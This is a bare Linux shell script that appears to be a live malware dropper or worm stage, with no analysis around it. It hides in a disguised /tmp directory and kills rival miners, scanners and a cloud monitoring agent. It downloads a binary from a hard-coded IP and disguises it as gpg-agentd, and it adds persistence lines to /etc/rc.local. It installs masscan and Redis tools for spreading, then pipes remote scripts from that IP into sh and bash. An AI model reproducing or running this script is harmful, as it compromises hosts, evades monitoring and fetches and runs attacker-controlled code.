sleep $( seq 3 7 | sort -R | head -n1 )
cd /tmp || cd /var/tmp
sleep 1
mkdir -p .ICE-unix/... && chmod -R 777 .ICE-unix && cd .ICE-unix/...
sleep 1
if [ -f .watch ]; then
rm -rf .watch
exit 0
fi
sleep 1
echo 1 > .watch
sleep 1
ps x | awk '!/awk/ && /redisscan|ebscan|redis-cli/ {print $1}' | xargs kill -9 2>/dev/null
ps x | awk '!/awk/ && /barad_agent|masscan|\.sr0|clay|udevs|\.sshd|xig/ {print $1}' | xargs kill -9 2>/dev/null
sleep 1
if ! [ -x /usr/bin/gpg-agentd ]; then
curl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.db
echo '/usr/bin/gpg-agentd' > /etc/rc.local
echo 'curl -fsSL 159.89.190.243/ash.php|sh' >> /etc/rc.local
echo 'exit 0' >> /etc/rc.local
fi
sleep 1
chmod +x /usr/bin/gpg-agentd && /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentd
sleep 1
if ! [ -x "$(command -v masscan)" ]; then
rm -rf /var/lib/apt/lists/*
rm -rf x1.tar.gz
if [ -x "$(command -v apt-get)" ]; then
export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y debconf-doc
apt-get install -y build-essential
apt-get install -y libpcap0.8-dev libpcap0.8
apt-get install -y libpcap*
apt-get install -y make gcc git
apt-get install -y redis-server
apt-get install -y redis-tools
apt-get install -y redis
apt-get install -y iptables
apt-get install -y wget curl
fi
if [ -x "$(command -v yum)" ]; then
yum update -y
yum install -y epel-release
yum update -y
yum install -y git iptables make gcc redis libpcap libpcap-devel
yum install -y wget curl
fi
sleep 1
curl -sL -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gz
sleep 1
[ -f x1.tar.gz ] && tar zxf x1.tar.gz && cd masscan-1.0.4 && make && make install && cd .. && rm -rf masscan-1.0.4
fi
sleep 3 && rm -rf .watch
bash -c 'curl -fsSL 159.89.190.243/rsh.php|bash' 2>/dev/null
